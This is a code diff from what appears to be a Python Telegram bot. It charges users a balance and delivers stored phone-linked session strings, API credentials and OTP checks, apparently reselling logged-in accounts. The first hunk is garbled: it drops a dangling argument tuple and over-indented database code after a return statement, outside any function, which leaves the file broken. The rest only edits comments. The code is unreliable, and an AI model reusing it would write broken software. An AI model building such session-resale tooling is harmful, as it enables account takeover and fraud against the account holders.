@@ -402,6 +402,16 @@ async def cancel_or_deny_click(event):
     event.handled = True
     return
 
+                    (target_phone, uid)
+                )
+                row = await cursor.fetchone()
+                if row and row[0]:
+                    try:
+                        api_id_val, api_hash_val, session_str_val = row[0].split("|", 2)
+                    except ValueError:
+                        pass
+
+ 
 # --- Complete High-Speed Error-Free Callback & Logic Engine ---
 @bot.on(events.CallbackQuery)
 async def callback_handler(event):
@@ -425,7 +435,7 @@ async def callback_handler(event):
                 await cursor.execute("SELECT balance FROM users WHERE uid = %s", (uid,))
                 user_row = await cursor.fetchone()
                 
-                # FIX: Safely extract the raw number value from the SQL tuple
+                # FIXED: Extracting the actual integer value at index 0 from the SQL tuple
                 user_balance = user_row[0] if user_row else 0
                 
                 if user_balance < price:
@@ -470,7 +480,6 @@ async def callback_handler(event):
         )
         retry_btn_kb = [[Button.inline("📩 Check OTP Again", data=f"checkotp:{phone_number}")]]
         
-        # Using event.respond to print the active login payload to client dashboard
         await event.respond(delivery_message, buttons=retry_btn_kb)
         return
 
